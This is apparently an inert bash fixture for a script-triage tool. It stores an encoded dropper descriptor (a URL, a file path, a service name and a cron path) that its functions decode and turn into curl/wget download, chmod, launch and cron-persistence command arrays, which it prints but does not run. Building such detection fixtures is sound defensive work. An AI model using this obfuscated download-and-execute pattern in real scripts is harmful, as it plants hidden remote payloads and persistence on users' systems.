#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_5eb824c4='%5d%24%18%63%5a%5b%4c%57%5a%24%57%59%56%4d%50%53%4c%46%4f%56%5a%5b%13%48%4a%58%5c%50%59%4c%46%59%4c%54%56%5b%4c%13%5e%59%50%5b%4c%46%4d%50%53%4c%13%4a%4f%48%55%4e%4c%46%54%56%4b%4c%13%4b%50%5a%57%48%5b%4a%4f%46%57%59%56%4a%4c%5a%5a%63%48%4b%48%57%5b%4c%59%24%4a%5c%59%53%46%48%59%4a%4f%46%4d%48%53%53%49%48%4a%52%63%5a%5b%48%4e%4c%46%4a%56%5c%55%5b%24%1c%63%4a%48%54%57%48%50%4e%55%46%50%4b%24%4a%48%54%57%48%50%4e%55%14%20%1c%4b%19%20%4d%17%4c%18%48%63%5c%59%53%24%4f%5b%5b%57%5a%21%16%16%20%1c%4b%19%20%4d%17%4c%18%48%15%4c%5f%48%54%57%53%4c%15%50%55%5d%48%53%50%4b%16%4d%4c%48%20%4a%20%4c%1b%15%5a%4f%63%5c%5a%4c%59%46%48%4e%4c%55%5b%24%2f%5c%55%5b%59%4c%5a%5a%33%48%49%16%20%1c%4b%19%20%4d%17%4c%18%48%63%4d%50%53%4c%46%57%48%5b%4f%24%16%5b%54%57%16%4f%5c%55%5b%59%4c%5a%5a%14%4a%48%4a%4f%4c%16%15%5a%5b%48%4e%4c%14%20%1c%4b%19%20%4d%17%4c%18%48%63%48%59%4a%4f%46%57%59%56%49%4c%24%5c%55%48%54%4c%14%54%63%5a%4c%59%5d%50%4a%4c%46%55%48%54%4c%24%5c%57%4b%48%5b%4c%14%20%1c%4b%19%20%4d%17%4c%18%48%15%5a%4c%59%5d%50%4a%4c%63%4a%59%56%55%46%57%48%5b%4f%24%16%4c%5b%4a%16%4a%59%56%55%15%4b%16%5c%57%4b%48%5b%4c%14%20%1c%4b%19%20%4d%17%4c%18%48'

readonly Codec_5eb824c4='percent_hex|subtract_modulo_256|19'



Load_5eb824c4() {

  e=()

  local raw="${Material_5eb824c4}" p

  for p in ${raw//%/ }; do [[ -n "$p" ]] && e+=("$((16#$p))"); done

}



Decode_5eb824c4() {

  d=()

  local i

  for ((i=0; i<${#e[@]}; i++)); do

    d+=("$(((e[i] + 25) % 256))")

  done

}



Recover_5eb824c4() {

  local -a e d

  local t n z i

  if ((2 > 1)); then n=left; else n=right; fi

  Load_5eb824c4

  for z in 1; do Decode_5eb824c4; done

  t=''

  local octal character

  for i in "${!d[@]}"; do

    printf -v octal '%03o' "${d[i]}"

    printf -v character '%b' "\\$octal"

    t+="$character"

  done

  printf '%s\n' "$t"

}



Inspect_5eb824c4() { local recovered field; local -a fields; recovered="$(Recover_5eb824c4)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }



Plan_5eb824c4() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_5eb824c4)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")

  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_5eb824c4; fi

